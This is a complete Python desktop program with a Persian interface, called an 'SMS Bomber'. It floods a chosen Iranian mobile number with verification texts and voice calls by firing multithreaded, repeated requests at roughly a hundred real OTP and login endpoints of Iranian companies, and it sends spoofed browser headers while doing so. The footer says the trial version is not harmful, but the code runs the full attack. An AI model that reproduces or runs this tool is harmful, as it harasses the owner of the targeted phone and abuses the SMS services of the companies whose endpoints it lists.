print("panel is -on-")
print("نوع پنل : TEST")
print("کد کاربري : ----")
print("--------------------------")
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import concurrent.futures
import requests
from fake_headers import Headers
import time

class SMSBomberGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SMS Bomber - Desktop Version")
        self.root.geometry("800x700")
        self.root.resizable(False, False)
        
        # تنظیم تم تیره
        self.setup_dark_theme()
        
        # متغیرهای برنامه
        self.is_running = False
        self.attack_count = 0
        
        # ایجاد رابط کاربری
        self.create_widgets()
        
    def setup_dark_theme(self):
        """تنظیم تم تیره برای برنامه"""
        self.root.configure(bg='#2b2b2b')
        style = ttk.Style()
        style.theme_use('clam')
        
        # تنظیم رنگ‌ها
        style.configure('TLabel', background='#2b2b2b', foreground='white')
        style.configure('TButton', background='#3c3c3c', foreground='white')
        style.configure('TEntry', fieldbackground='#3c3c3c', foreground='white')
        style.configure('TFrame', background='#2b2b2b')
        style.configure('Header.TLabel', font=('Arial', 18, 'bold'), foreground='#4CAF50')
        
    def create_widgets(self):
        """ایجاد ویجت‌های رابط کاربری"""
        
        # هدر برنامه
        header_frame = ttk.Frame(self.root)
        header_frame.pack(pady=20)
        
        title_label = ttk.Label(header_frame, text="💣 SMS Bomber for Desktop", style='Header.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, text="نسخه : آزمايشي", foreground='#888')
        subtitle_label.pack()
        
        # بخش ورودی شماره
        input_frame = ttk.Frame(self.root)
        input_frame.pack(pady=20, padx=20, fill='x')
        
        ttk.Label(input_frame, text="شماره موبایل (بدون +98):").pack(anchor='w')
        
        self.phone_entry = ttk.Entry(input_frame, font=('Arial', 12), width=20)
        self.phone_entry.pack(pady=5, fill='x')
        self.phone_entry.insert(0, "09")
        
        # بخش تنظیمات
        settings_frame = ttk.Frame(self.root)
        settings_frame.pack(pady=10, padx=20, fill='x')
        
        ttk.Label(settings_frame, text="تعداد راند ها:").grid(row=0, column=0, sticky='w', padx=5)
        self.count_spinbox = ttk.Spinbox(settings_frame, from_=1, to=100, width=10)
        self.count_spinbox.grid(row=0, column=1, padx=5)
        self.count_spinbox.set("1")
        
        ttk.Label(settings_frame, text="تعداد Thread:").grid(row=0, column=2, sticky='w', padx=20)
        self.thread_spinbox = ttk.Spinbox(settings_frame, from_=1, to=50, width=10)
        self.thread_spinbox.grid(row=0, column=3, padx=5)
        self.thread_spinbox.set("20")
        
        # دکمه‌های کنترل
        button_frame = ttk.Frame(self.root)
        button_frame.pack(pady=20)
        
        self.start_button = ttk.Button(button_frame, text="🚀 شروع حمله", command=self.start_attack, width=18)
        self.start_button.pack(side='left', padx=14)
        
        self.stop_button = ttk.Button(button_frame, text="⏹ توقف", command=self.stop_attack, width=15, state='disabled')
        self.stop_button.pack(side='left', padx=1)
        
        self.clear_button = ttk.Button(button_frame, text="🧹 پاک کردن", command=self.clear_logs, width=15)
        self.clear_button.pack(side='left', padx=1)
        
        # بخش لاگ و نتایج
        log_frame = ttk.Frame(self.root)
        log_frame.pack(pady=10, padx=20, fill='both', expand=True)
        
        ttk.Label(log_frame, text="لاگ عملیات:").pack(anchor='w')
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, bg='#1e1e1e', fg='white', 
                                                  insertbackground='white', font=('Courier', 10))
        self.log_text.pack(fill='both', expand=True, pady=5)
        
        # وضعیت برنامه
        status_frame = ttk.Frame(self.root)
        status_frame.pack(pady=10, padx=20, fill='x')
        
        self.status_label = ttk.Label(status_frame, text="آماده اجرا", foreground='#4CAF50')
        self.status_label.pack(side='left')
        
        self.stats_label = ttk.Label(status_frame, text="موفق: 0 | ناموفق: 0 | کل: 0", foreground='#FF9800')
        self.stats_label.pack(side='right')
        
    def API_LIST(self, phoneNumber: str):
        """لیست API‌ها"""
        phoneNumber_countryCode = phoneNumber.replace('+98', '')
        if phoneNumber_countryCode.startswith('0'):
            phoneNumber_countryCode = phoneNumber_countryCode[1:]
        
        phoneNumber_zero = "0" + phoneNumber_countryCode

        return [
            {"name": "Snapp", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", "payload": {"cellphone": phoneNumber_countryCode}},
            {"name": "Snapp V2", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "payload": {"cellphone": phoneNumber}},
            {"name": "Tap30", "method": "POST", "url": "https://tap33.me/api/v2/user", "payload": {"credential": {"phoneNumber": phoneNumber_zero, "role": "PASSENGER"}}},
            {"name": "Divar", "method": "POST", "url": "https://api.divar.ir/v5/auth/authenticate", "payload": {"phone": phoneNumber}},
            {"name": "SnappFood", "method": "POST", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "payload": {"cellphone": phoneNumber_zero, "client": "PWA"}},
            {"name": "TamimPishro", "method": "POST", "url": "https://www.tamimpishro.com/site/api/v1/user/otp", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Fafait", "method": "POST", "url": "https://api2.fafait.net/oauth/check-user", "payload": {"id": phoneNumber_zero}},
            {"name": "Telewebion", "method": "POST", "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", "payload": {"code": "98", "phone": phoneNumber, "smsStatus": "default"}},
            {"name": "Caropex", "method": "POST", "url": "https://caropex.co/api/v1/auth/otp", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Hamlex", "method": "POST", "url": "https://hamlex.ir/register.php", "data": "phoneNumber=" + phoneNumber_zero + "&register="},
            {"name": "Irwco", "method": "POST", "url": "https://irwco.ir/register", "data": "mobile=" + phoneNumber_zero},
            {"name": "Moshaveran724", "method": "POST", "url": "https://moshaveran724.ir/m/pms.php", "data": "againkey=" + phoneNumber_zero + "&cache=false"},
            {"name": "Sibbank", "method": "POST", "url": "https://api.sibbank.ir/v1/auth/login", "payload": {"phone_number": phoneNumber_zero}},
            {"name": "Steelalborz", "method": "POST", "url": "https://steelalborz.com/wp-admin/admin-ajax.php", "data": "action=digits_check_mob&mobileNo=" + phoneNumber_zero},
            {"name": "Arshian", "method": "POST", "url": "https://api.arshiyan.com/send_code", "payload": {"country_code": "98", "phone_number": phoneNumber}},
            {"name": "Topnoor", "method": "POST", "url": "https://backend.topnoor.ir/web/v1/user/otp", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Alinance", "method": "POST", "url": "https://api.alinance.com/user/register/mobile/send/", "payload": {"phone_number": phoneNumber_zero}},
            {"name": "Alopeyk Safir", "method": "POST", "url": "https://api.alopeyk.com/safir-service/api/v1/login", "payload": {"phone": phoneNumber_zero}},
            {"name": "Chaymarket", "method": "POST", "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php", "data": "action=digits_check_mob&mobileNo=" + phoneNumber_zero},
            {"name": "Ehteraman", "method": "POST", "url": "https://api.ehteraman.com/api/request/otp", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Paymishe", "method": "POST", "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Podro", "method": "POST", "url": "https://api.pod.ir/api/v1/otp/registerOrLogin", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Rayshomar", "method": "POST", "url": "https://api.rayshomar.ir/api/Register/RegistrMobile", "data": "MobileNumber=" + phoneNumber_zero},
            {"name": "Amoomilad", "method": "POST", "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", "payload": {"PhoneNumber": phoneNumber_zero}},
            {"name": "Bitex24", "method": "GET", "url": "https://bitex24.com/api/v1/auth/sendSms?mobile=" + phoneNumber_zero + "&dial_code=0"},
            {"name": "Candoosms", "method": "POST", "url": "https://www.candoosms.com/wp-admin/admin-ajax.php", "data": "action=send_sms&phone=" + phoneNumber_zero},
            {"name": "Offch", "method": "POST", "url": "https://api.offch.com/auth/otp", "payload": {"username": phoneNumber_zero}},
            {"name": "Sabziman", "method": "POST", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "data": "action=newphoneexist&phonenumber=" + phoneNumber_zero},
            {"name": "Tajtehran", "method": "POST", "url": "https://tajtehran.com/RegisterRequest", "data": "mobile=" + phoneNumber_zero + "&password=mamad1234"},
            {"name": "MrBilit (Call)", "method": "GET", "url": "https://auth.mrbilit.com/api/Token/send/byCall?mobile=" + phoneNumber_zero},
            {"name": "Gap (Call)", "method": "GET", "url": "https://core.gap.im/v1/user/resendCode.json?mobile=" + phoneNumber + "&type=IVR"},
            {"name": "Novibook (Call)", "method": "POST", "url": "https://novinbook.com/index.php?route=account/phone", "data": "phone=" + phoneNumber_zero + "&call=yes"},
            {"name": "Azki (Call)", "method": "GET", "url": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=" + phoneNumber_zero},
            {"name": "Janebi", "method": "POST", "url": "https://janebi.com/signin?do", "data": {"resend": phoneNumber_zero}},
            {"name": "4hair", "method": "POST", "url": "https://4hair.ir/user/login.php", "data": {"num": phoneNumber_zero, "ok": ""}},
            {"name": "iGame", "method": "POST", "url": "https://igame.ir/api/play/otp/send", "payload": {"phone": phoneNumber_zero}},
            {"name": "TWsms", "method": "POST", "url": "https://twsms.ir/client/register.php", "data": {"mobile": phoneNumber_zero, "agree": "agree", "sendsms": "1"}},
            {"name": "BaradaranToy", "method": "POST", "url": "https://baradarantoy.ir/send_confirm_sms_ajax.php", "data": {"user_tel": phoneNumber_zero}},
            {"name": "KavirMotor", "method": "POST", "url": "https://kavirmotor.com/sms/send", "payload": {"phoneNumber": phoneNumber_zero}},
            {"name": "Chechilas", "method": "POST", "url": "https://chechilas.com/user/login", "data": {"mob": phoneNumber_zero}},
            {"name": "Searchii", "method": "POST", "url": "https://searchii.ir//controler//phone_otp.php", "data": {"mobile_number": phoneNumber_zero, "action": "send_otp", "login": "user"}},
            {"name": "Badparak", "method": "POST", "url": "https://badparak.com/register/request_verification_code", "payload": {"mobile": phoneNumber_zero}},
            {"name": "HermesKala", "method": "POST", "url": "https://hermeskala.com//login/send_vcode", "payload": {"mobile_number": phoneNumber_zero}},
            {"name": "ElinorBoutique", "method": "POST", "url": "https://api.elinorboutique.com/v1/customer/register-login", "payload": {"mobile": phoneNumber_zero}},
            {"name": "AtlasMode", "method": "POST", "url": "https://api.atlasmode.ir/v1/customer/register-login?version=new2", "payload": {"mobile": phoneNumber_zero}},
            {"name": "PooshakShoniz", "method": "POST", "url": "https://api.pooshakshoniz.com/v1/customer/register-login?version=new1", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Ubike", "method": "POST", "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", "data": {"telephone": phoneNumber_zero}},
            {"name": "Benedito", "method": "POST", "url": "https://api.benedito.ir/v1/customer/register-login?version=new1", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Rubeston", "method": "POST", "url": "https://www.rubeston.com/api/customers/login-register", "payload": {"mobile": phoneNumber_zero, "step": "1"}},
            {"name": "PrimaShop", "method": "POST", "url": "https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", "data": {"telephone": phoneNumber_zero}},
            {"name": "PayaGym", "method": "POST", "url": "https://payagym.com/wp-admin/admin-ajax.php", "data": {"mobile": phoneNumber_zero, "action": "kerasno_proform_register_inline_send"}},
            {"name": "Bartarinha", "method": "POST", "url": "https://bartarinha.com/Advertisement/Users/RequestLoginMobile", "data": {"mobileNo": phoneNumber_zero}},
            {"name": "ManoShahr", "method": "POST", "url": "https://manoshahr.ir/jq.php", "data": {"mobile": phoneNumber_zero, "class_name": "public_login", "function_name": "sendCode"}},
            {"name": "NalinoCo", "method": "POST", "url": "https://www.nalinoco.com/api/customers/login-register", "payload": {"mobile": phoneNumber_zero, "step": "1"}},
            {"name": "Hiss", "method": "POST", "url": "https://hiss.ir/wp-admin/admin-ajax.php", "data": {"phone_email": phoneNumber_zero, "action": "bakala_send_code"}},
            {"name": "Tahrir-Online", "method": "POST", "url": "https://tahrir-online.ir/wp-admin/admin-ajax.php", "data": {"phone": phoneNumber, "action": "mobix_send_otp_code"}},
            {"name": "MartDay", "method": "POST", "url": "https://martday.ir/api/customer/member/register/", "data": {"email": phoneNumber_zero, "accept_term": "on"}},
            {"name": "Paaakar", "method": "POST", "url": "https://api.paaakar.com/v1/customer/register-login?version=new1", "payload": {"mobile": phoneNumber_zero}},
            {"name": "ElectraStore", "method": "POST", "url": "https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code", "data": {"telephone": phoneNumber_zero}},
            {"name": "AtrinElec", "method": "POST", "url": "https://www.atrinelec.com/ajax/SendSmsVerfiyCode", "data": {"mobile": phoneNumber_zero}},
            {"name": "KetabWeb", "method": "POST", "url": "https://ketabweb.com/login/?usernameCheck=1", "data": {"username": phoneNumber_zero}},
            {"name": "Dastaneman", "method": "POST", "url": "https://dastaneman.com/User/SendCode", "data": {"mobile": "0098" + phoneNumber_countryCode}},
            {"name": "80w", "method": "POST", "url": "https://80w.ir/wp-admin/admin-ajax.php", "data": {"login": phoneNumber_zero, "action": "logini_first"}},
            {"name": "NoavarPub", "method": "POST", "url": "https://noavarpub.com/logins/login.php", "data": {"phone": phoneNumber_zero, "submit": "123"}},
            {"name": "HovalVakil", "method": "GET", "url": "https://api.hovalvakil.com/api/User/SendConfirmCode?userName=" + phoneNumber_countryCode},
            {"name": "DigiGhate", "method": "GET", "url": "https://api.digighate.com/v2/public/code?phone=" + phoneNumber_countryCode},
            {"name": "AzarbadBook", "method": "POST", "url": "https://azarbadbook.ir/ajax/login_j_ajax_ver/", "data": {"phone": phoneNumber}},
            {"name": "KanoonBook", "method": "POST", "url": "https://www.kanoonbook.ir/store/customer_otp", "data": {"customer_username": phoneNumber, "task": "customer_phone"}},
            {"name": "CheshmandazKetab", "method": "POST", "url": "https://www.cheshmandazketab.ir/Register", "data": {"phone": phoneNumber_zero, "login": "1"}},
            {"name": "Ketab.ir", "method": "GET", "url": "https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=" + phoneNumber_zero + "&OtpSmsType=1"},
            {"name": "SnappShop", "method": "POST", "url": "https://apix.snappshop.co/auth/v1/pre-login", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Ketabium", "method": "POST", "url": "https://www.ketabium.com/login-register", "data": {"username": phoneNumber_zero}},
            {"name": "RiraBook", "method": "POST", "url": "https://rirabook.com/loginAth", "data": {"mobile1": phoneNumber_zero, "loginbt1": ""}},
            {"name": "PashikShoes", "method": "POST", "url": "https://api.pashikshoes.com/v1/customer/register-login", "payload": {"mobile": phoneNumber_zero}},
            {"name": "ShimaShoes", "method": "POST", "url": "https://shimashoes.com/api/customer/member/register/", "data": {"email": phoneNumber_zero}},
            {"name": "TamimPishro", "method": "POST", "url": "https://www.tamimpishro.com/site/api/v1/user/otp", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Fafait", "method": "POST", "url": "https://api2.fafait.net/oauth/check-user", "payload": {"id": phoneNumber_zero}},
            {"name": "Telewebion", "method": "POST", "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", "payload": {"code": "98", "phone": phoneNumber, "smsStatus": "default"}},
            {"name": "Caropex", "method": "POST", "url": "https://caropex.co/api/v1/auth/otp", "payload": {"mobile": phoneNumber_zero}},
            {"name": "MCI Shop", "method": "POST", "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp", "payload": {"msisdn": phoneNumber}},
            {"name": "Hamrahbours", "method": "POST", "url": "https://api.hbbs.ir/authentication/SendCode", "payload": {"MobileNumber": phoneNumber_zero}},
            {"name": "Homtick", "method": "POST", "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode", "payload": {"mobileOrEmail": phoneNumber_zero}},
            {"name": "Iranamlaak", "method": "POST", "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", "payload": {"AgencyMobile": phoneNumber_zero}},
            {"name": "Karchidari", "method": "POST", "url": "https://api.kcd.app/api/v1/auth/login", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Mazoo", "method": "POST", "url": "https://mazoocandle.ir/login", "payload": {"phone": phoneNumber}},
            {"name": "Paymishe", "method": "POST", "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Podro", "method": "POST", "url": "https://api.pod.ir/api/v1/otp/registerOrLogin", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Rayshomar", "method": "POST", "url": "https://api.rayshomar.ir/api/Register/RegistrMobile", "data": "MobileNumber=" + phoneNumber_zero},
            {"name": "Amoomilad", "method": "POST", "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", "payload": {"PhoneNumber": phoneNumber_zero}},
            {"name": "Bitex24", "method": "GET", "url": "https://bitex24.com/api/v1/auth/sendSms?mobile=" + phoneNumber_zero + "&dial_code=0"},
            {"name": "Candoosms", "method": "POST", "url": "https://www.candoosms.com/wp-admin/admin-ajax.php", "data": "action=send_sms&phone=" + phoneNumber_zero},
            {"name": "Offch", "method": "POST", "url": "https://api.offch.com/auth/otp", "payload": {"username": phoneNumber_zero}},
            {"name": "Sabziman", "method": "POST", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "data": "action=newphoneexist&phonenumber=" + phoneNumber_zero},
            {"name": "Sabziman", "method": "POST", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "data": "action=newphoneexist&phonenumber=" + phoneNumber_zero},
            {"name": "MCI Shop", "method": "POST", "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp", "payload": {"msisdn": phoneNumber}},
            {"name": "Hamrahbours", "method": "POST", "url": "https://api.hbbs.ir/authentication/SendCode", "payload": {"MobileNumber": phoneNumber_zero}},
            {"name": "Homtick", "method": "POST", "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode", "payload": {"mobileOrEmail": phoneNumber_zero}},
            {"name": "Iranamlaak", "method": "POST", "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", "payload": {"AgencyMobile": phoneNumber_zero}},
            {"name": "Karchidari", "method": "POST", "url": "https://api.kcd.app/api/v1/auth/login", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Mazoo", "method": "POST", "url": "https://mazoocandle.ir/login", "payload": {"phone": phoneNumber}},
            {"name": "Paymishe", "method": "POST", "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Podro", "method": "POST", "url": "https://api.pod.ir/api/v1/otp/registerOrLogin", "payload": {"mobile": phoneNumber_zero}},
            {"name": "Rayshomar", "method": "POST", "url": "https://api.rayshomar.ir/api/Register/RegistrMobile", "data": "MobileNumber=" + phoneNumber_zero},
            {"name": "Amoomilad", "method": "POST", "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", "payload": {"PhoneNumber": phoneNumber_zero}},
            {"name": "Bitex24", "method": "GET", "url": "https://bitex24.com/api/v1/auth/sendSms?mobile=" + phoneNumber_zero + "&dial_code=0"},
            {"name": "Candoosms", "method": "POST", "url": "https://www.candoosms.com/wp-admin/admin-ajax.php", "data": "action=send_sms&phone=" + phoneNumber_zero},
            {"name": "Offch", "method": "POST", "url": "https://api.offch.com/auth/otp", "payload": {"username": phoneNumber_zero}},
            {"name": "Sabziman", "method": "POST", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "data": "action=newphoneexist&phonenumber=" + phoneNumber_zero}
        ]
    
    def perform_request(self, api):
        """ارسال درخواست به API"""
        header = Headers(browser="chrome", os="win").generate()
        try:
            if api["method"] == "POST":
                if "payload" in api:
                    res = requests.post(api["url"], json=api["payload"], headers=header, timeout=7)
                else:
                    # برای APIهایی که از data استفاده می‌کنند
                    headers = header.copy()
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    res = requests.post(api["url"], data=api.get("data"), headers=headers, timeout=7)
            else:
                # برای APIهای GET
                res = requests.get(api["url"], headers=header, timeout=7)
            
            success = res.status_code < 400
            status = "✅" if success else "❌"
            self.log(f"{status} {api['name']}: کد {res.status_code}")
            return success
        except requests.exceptions.Timeout:
            self.log(f"⏱️ {api['name']}: زمان انتظار به پایان رسید")
            return False
        except requests.exceptions.ConnectionError:
            self.log(f"🔌 {api['name']}: خطای اتصال")
            return False
        except Exception as e:
            self.log(f"❌ {api['name']}: خطا - {str(e)[:50]}")
            return False
    
    def log(self, message):
        """افزودن پیام به لاگ"""
        timestamp = time.strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        
        # اضافه کردن به ویجت در thread اصلی
        self.root.after(0, self._update_log, log_message)
    
    def _update_log(self, message):
        """به‌روزرسانی ویجت لاگ (در thread اصلی)"""
        self.log_text.insert(tk.END, message)
        self.log_text.see(tk.END)
    
    def update_stats(self, success, total):
        """به‌روزرسانی آمار"""
        failed = total - success
        self.root.after(0, self._update_stats_gui, success, failed, total)
    
    def _update_stats_gui(self, success, failed, total):
        """به‌روزرسانی آمار در GUI"""
        self.stats_label.config(text=f"موفق: {success} | ناموفق: {failed} | کل: {total}")
    
    def start_attack(self):
        """شروع حمله"""
        phone = self.phone_entry.get().strip()
        
        # اعتبارسنجی شماره
        if not phone.startswith("09") or len(phone) != 11:
            messagebox.showerror("خطا", "لطفا شماره را به صورت 09123456789 وارد کنید.")
            return
        
        try:
            attack_count = int(self.count_spinbox.get())
            thread_count = int(self.thread_spinbox.get())
        except ValueError:
            messagebox.showerror("خطا", "مقادیر عددی را به درستی وارد کنید.")
            return
        
        # نمایش تعداد APIها
        apis = self.API_LIST(phone)
        if messagebox.askyesno("تایید", 
                               f"آیا مطمئن هستید؟\n\n"
                               f"شماره: {phone}\n"
                               f"تعداد درخواست‌ها: {attack_count}\n"
                               f"تعداد Thread: {thread_count}\n"
                               f" API: {len(apis)}"):
            
            # غیرفعال کردن دکمه شروع و فعال کردن دکمه توقف
            self.start_button.config(state='disabled')
            self.stop_button.config(state='normal')
            self.is_running = True
            
            # شروع حمله در thread جداگانه
            attack_thread = threading.Thread(
                target=self.run_attack, 
                args=(phone, attack_count, thread_count),
                daemon=True
            )
            attack_thread.start()
    
    def run_attack(self, phone, attack_count, thread_count):
        """اجرای حمله در thread جداگانه"""
        self.log(f"🚀 شروع حمله به شماره: {phone}")
        self.log(f"📊 تعداد درخواست‌ها: {attack_count}")
        self.log(f"⚡ تعداد Thread: {thread_count}")
        self.log(f"🔗 تعداد API: {len(self.API_LIST(phone))}")
        self.log("="*50)
        
        apis = self.API_LIST(phone)
        total_success = 0
        total_requests = 0
        
        for i in range(attack_count):
            if not self.is_running:
                break
            
            self.root.after(0, self.status_label.config, 
                           text=f"🚀در حال اجرا... دور {i+1}/{attack_count}")
            
            # اجرای موازی درخواست‌ها
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
                results = list(executor.map(self.perform_request, apis))
            
            success_count = sum(results)
            total_success += success_count
            total_requests += len(apis)
            
            self.update_stats(total_success, total_requests)
            self.log(f"📊 دور {i+1}: {success_count}/{len(apis)} موفق")
            
            if i < attack_count - 1 and self.is_running:
                time.sleep(1)  # تاخیر بین دورها
        
        # پایان عملیات
        self.root.after(0, self.attack_finished)
        self.log("="*50)
        self.log(f"🏁 عملیات پایان یافت!")
        self.log(f"🎯 مجموع موفق: {total_success}/{total_requests}")
        self.log(f"📈 درصد موفقیت: {(total_success/total_requests*100):.1f}%" if total_requests > 0 else "📈 درصد موفقیت: 0%")
        self.root.after(0, self.status_label.config, text="پایان یافت")
    
    def attack_finished(self):
        """پایان حمله"""
        self.is_running = False
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
    
    def stop_attack(self):
        """توقف حمله"""
        self.is_running = False
        self.log("⏹ عملیات متوقف شد توسط کاربر")
        self.root.after(0, self.status_label.config, text="⏱در حال توقف صبور باشيد")
    
    def clear_logs(self):
        """پاک کردن لاگ‌ها"""
        self.log_text.delete(1.0, tk.END)
        self.stats_label.config(text="موفق: 0 | ناموفق: 0 | کل: 0")
        self.status_label.config(text="🚀آماده اجراي دوباره")

def main():
    """تابع اصلی اجرای برنامه"""
    root = tk.Tk()
    app = SMSBomberGUI(root)
    
    # اضافه کردن اطلاعات سازنده
    info_frame = ttk.Frame(root)
    info_frame.pack(side='bottom', pady=5, fill='x')
    
    info_label = ttk.Label(info_frame, text="سازنده: @M_M_D_MM in TEL", 
                          foreground='#888', font=('Arial', 10))
    info_label.pack()
    
    warning_label = ttk.Label(info_frame, text="⚠️اين نسخه آزمايشي ميباشد و مخرب نيست⚠", 
                             foreground='#ff4444', font=('Arial', 12))
    warning_label.pack()
    
    root.mainloop()

if __name__ == '__main__':
    main()
